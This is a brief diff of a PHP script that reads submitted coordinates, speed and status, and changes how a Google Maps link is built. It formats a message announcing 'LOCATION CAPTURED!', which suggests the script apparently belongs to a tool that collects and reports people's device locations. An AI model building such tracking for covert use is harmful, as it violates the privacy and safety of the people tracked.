@@ -16,7 +16,7 @@ $spd = $_POST['Spd'];
 $status = $_POST['Status'];
 
 // Generate Google Maps Link
-$googleMapsLink = "https://www.google.com/maps/place/" . $lat . "+" . $lon;
+$googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
 
 // Format Message
 $message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
